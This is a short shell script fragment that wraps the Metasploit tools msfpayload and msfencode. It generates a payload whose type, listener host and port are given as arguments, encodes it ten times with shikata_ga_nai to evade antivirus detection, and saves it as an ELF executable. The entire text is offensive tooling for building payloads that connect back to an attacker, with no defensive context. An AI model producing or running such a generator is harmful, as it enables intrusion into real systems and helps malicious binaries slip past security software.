echo "[Wait] While I generate your payload...."
echo ""
msfpayload $1 LHOST=$2 LPORT=$3 R |msfencode -t elf -e x86/shikata_ga_nai -c 10 >>$4
echo "[OK] Successfully generated..."
